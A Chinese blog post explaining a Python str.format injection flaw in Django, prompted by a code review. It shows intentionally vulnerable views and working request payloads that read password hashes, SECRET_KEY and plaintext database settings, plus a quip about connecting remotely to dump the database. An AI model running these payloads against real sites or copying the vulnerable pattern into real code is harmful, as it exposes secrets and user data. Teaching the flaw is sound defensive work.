# python format格式化函数漏洞

突然提这个漏洞是提交代码到公司服务器后，组长review我的代码时提的，说format其实不安全，百分号形式虽然丑，但还是尽量用百分号形式写，然后就有了下面研究，内容主要参考：

[Python 格式化字符串漏洞（Django为例）](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

## python常见格式化字符串

python中比较常见的格式化字符串方式有：

1.百分号形式进行字符串格式化

```python
In [1]: 'Hello, %s, I love %s'%('ayuliao','python')
Out[1]: 'Hello, ayuliao, I love python'
```

2.使用format函数进行字符串格式化

```python
In [4]: '{name}'.format(name='ayuliao') # 普通用法
Out[4]: 'ayuliao'

In [5]: '{name!r}'.format(name='ayuliao') # 等同于 repr(name)
Out[5]: "'ayuliao'"

In [6]: '{num:0.2f}'.format(num=2.3333) # 保留后两位小数
Out[6]: '2.33'

In [7]: 'int: {0:d}; hex: {0:#x}; oct: {0:#o}; bin: {0:#b}'.format(42) # 转换进制
   ...:
Out[7]: 'int: 42; hex: 0x2a; oct: 0o52; bin: 0b101010

In [9]: '{arr[2]}'.format(arr=[1,2,3]) # 获取对象属性
Out[9]: '3'
```

3.python3.6以上可以使用 f 关键字进行格式化

f关键字有获取当前 context 下变量的能力

```python
In [10]: a = 'Hello'

In [11]: f'{a} world'
Out[11]: 'Hello world'
```

## format造成的安全隐患

重点聊聊format()方法会带来的问题，我复现一下参考文章中的例子

在Django项目中使用format()函数，Django是Python Web开发的一款知名框架

创建一个Django项目，并在该项目中创建一个应用，在该应用的views.py上创建使用format()函数的危险方法

```python
#获得登录用户的email
def hackview(requests, *args, **kwargs):
    u = requests.GET.get('email')
    template = 'Hello {user}, This is your email:' + requests.GET.get('email')
    return HttpResponse(template.format(user=requests.user))
```

hackview()方法的作用非常简单，就是获取登录用户的email，在urls.py上注册一个该方法对应的url路径

```python
urlpatterns = [
    url(r'^hackview/', hackview),
    ...
```

正常的访问：

![format_1](http://p6un02lk4.bkt.clouddn.com/format_1.png)

但是如果用户登录，我们完成可以利用这个方法获得用户的密码，只需稍微修改一下请求url

![format_2](http://p6un02lk4.bkt.clouddn.com/format_2.png)

从图中可以看出，我们获得了当前登录用户的用户名、用户在数据库中的ID、进过哈希处理后的用户密码

这个请求在Django中发生了什么？

首先user是hackview()方法上下文中仅有的一个变量，在hackview()方法中，使用了format(user=request.user)，也就是将发起请求的当前用户放到字符串中，在Django中requests.user就是当前对象，如果不做任何处理，打印时Django就会输出当前用户的username

但我们没有正常请求这个链接，通过{user.pk}|{user.username}|{user.password}作为参数请求链接，相当于打印字符变为

```
Hello {user}, This is your email:{user.pk}|{user.username}|{user.password}
```

那么经过format处理，当然就将requests.user中的相关参数都打印出来了

如果编写web项目的人毫无安全意识，出现下面的方法

```python
from django.shortcuts import  get_object_or_404
from django.contrib.auth.models import User

def hackview2(requests, *args, **kwargs):
    user = get_object_or_404(User, pk = requests.GET.get('uid'))
    template = 'Hello {user}\'s, This is your email:' + requests.GET.get('email')
    return HttpResponse(template.format(user=user))
```

我们就可以获得任何用户的用户名和进过哈希处理后的密码了

![format_3](http://p6un02lk4.bkt.clouddn.com/format_3.png)

通过传递uid，从而获得数据库中相应id用户的信息

但是这种“骚”写法现实中还是比较少有的

## 提取高敏信息

如果真的遇到了hackview()方法中的写法，光获得用户哈希后的密码其实没啥意思，感觉也没啥，毕竟密码是经过加盐哈希过的，没了就没了，但问题比想象的严重。

我们可以利用hackview()方法获得Web项目的所有配置信息，包括，项目秘钥，数据库地址、用户名和明文密码。

Django是个庞大繁杂的工具，它默认就我们提供了缓存、ORM、管理后台、反爬限制等功能，这可以让我们快速开发一个web系统，但这也称为了它的弱点，越庞大的项目，存在bug的可能性越大

思路：通过挖掘Django自带应用，看看这些应用中有无导入Django配置文件

Django自带的后台就导入了项目的配置文件

![format_4](http://p6un02lk4.bkt.clouddn.com/format_4.png)

或者进入debug模式，慢慢找，可以发现 requests.user._meta.app_config.module.admin.settings下有我们想要的内容

![format_5](http://p6un02lk4.bkt.clouddn.com/format_5.png)

![format_6](http://p6un02lk4.bkt.clouddn.com/format_6.png)

将我们找到这些路径作为请求参数，请求hackview()方法对应的接口，就可以获得该web项目的敏感信息了

有3个具体的实例

获取web项目的秘钥

```
http://localhost:8000/hackview/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

返回内容：

```
Hello AnonymousUser, This is your email:qxzxiv(6v4v+#^4$n^kwmw!)r5_=aq(v)o&sj@8p2&)j=4-8h$
```



获取该web项目数据库的配置

```
http://localhost:8000/hackview/?email={user.groups.model._meta.app_config.module.admin.settings.DATABASES}
```

![format_7](http://p6un02lk4.bkt.clouddn.com/format_7.png)

很负责的告诉你，全是明文，接下来怎么骚不用我教了吧，远程连上去，将它提了

## 结尾

组长你是怎么知道这个的?

他的眼神突然变得深邃，似乎想起了很远很远的事，想起了以前的兄弟，想起了以前的爱人，想起...，想到情深处，他望着远方的天空，内心的忧伤弥漫而出，天空似乎也变得阴沉，默默的他吸了口手中快烧到头的烟，用半沙哑的声音说，老子之前的项目就因为这个被脱裤了。

en......莫名的开心

生活愉快 :-D

